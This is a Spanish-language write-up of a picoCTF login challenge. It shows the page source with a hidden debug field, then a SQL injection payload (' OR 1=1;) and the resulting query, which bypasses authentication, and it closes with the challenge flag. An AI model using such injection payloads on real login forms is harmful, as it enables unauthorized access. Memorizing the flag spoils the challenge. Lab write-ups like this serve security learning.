## Objetivo
Can you login to this website?
## Solución
- ##### Inspeccionamos el código fuente de la página, y podemos ver que hay un valor "hidden".
```html
<!doctype html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-md-12">
            <div class="panel panel-primary" style="margin-top:50px">
                <div class="panel-heading">
                    <h3 class="panel-title">Log In</h3>
                </div>
                <div class="panel-body">
                    <form action="login.php" method="POST">
                        <fieldset>
                            <div class="form-group">
                                <label for="username">Username:</label>
                                <input type="text" id="username" name="username" class="form-control">
                            </div>
                            <div class="form-group">
                                <label for="password">Password:</label>
                                <div class="controls">
                                    <input type="password" id="password" name="password" class="form-control">
                                </div>
                            </div>

                            <input type="hidden" name="debug" value="1">

                            <div class="form-actions">
                                <input type="submit" value="Login" class="btn btn-primary">
                            </div>
                        </fieldset>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
```

- ##### Haremos una inyección SQL para acceder al sitio. 
```
username: ' OR 1=1;
password: password
SQL query: SELECT * FROM users WHERE name='' OR 1=1;' AND password='password'

Logged in! But can you see the flag, it is in plainsight.
```

- ##### Y al acceder, no podemos ver la bandera, pero si inspeccionamos el código fuente nuevamente, obtenemos la bandera
```
Flag: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}
```
## Notas Adicionales
## Referencias
- [PicoCTF](https://play.picoctf.org)